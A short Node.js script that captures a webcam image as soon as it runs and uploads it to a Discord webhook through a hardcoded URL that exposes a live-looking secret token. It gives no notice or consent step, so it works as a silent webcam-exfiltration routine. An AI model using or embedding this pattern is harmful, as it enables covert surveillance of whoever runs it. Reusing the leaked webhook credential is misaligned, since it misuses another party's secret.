const NodeWebcam = require("node-webcam");
const { WebhookClient } = require("discord.js")

const url = "https://discord.com/api/webhooks/1067492703518072852/kNvhEACfed6Zz5omR2ckzFDG-7Po0j0d-ZSq9XxVTG8wwjdYkKNXOtthN4HgWpVfElAi"
const hook = new WebhookClient({url: url})
//
var options = {
    //Picture related
    width: 1280,
    height: 720,
    quality: 100,
    // Number of frames to capture
    // More the frames, longer it takes to capture
    // Use higher framerate for quality. Ex: 60
    frames: 60,
    //Delay in seconds to take shot
    //if the platform supports miliseconds
    //use a float (0.1)
    //Currently only on windows
    delay: 0,
    //Save shots in memory
    saveShots: true,
    // [jpeg, png] support varies
    // Webcam.OutputTypes
    output: "png",
    //Which camera to use
    //Use Webcam.list() for results
    //false for default device
    device: "2",
    // [location, buffer, base64]
    // Webcam.CallbackReturnTypes
    callbackReturn: "location",
    //Logging
    verbose: true
};
const Webcam = NodeWebcam.create(options);
Webcam.capture( "test_picture", function( err, data ) {
    console.log(data)
    hook.send({content: `hello`, files: [`${__dirname}/test_picture.png`] }).then(msg => { null })
} );

async function run() {
    const cam = await get_cam()
    // cam.capture( "test_picture", function( err, data ) {} );
}

function get_cam() {
    return new Promise((res, err) => {
        Webcam.list(list => {
            res(NodeWebcam.create( { device: list[1], opts: options } ))
        });
    })
}

run()
return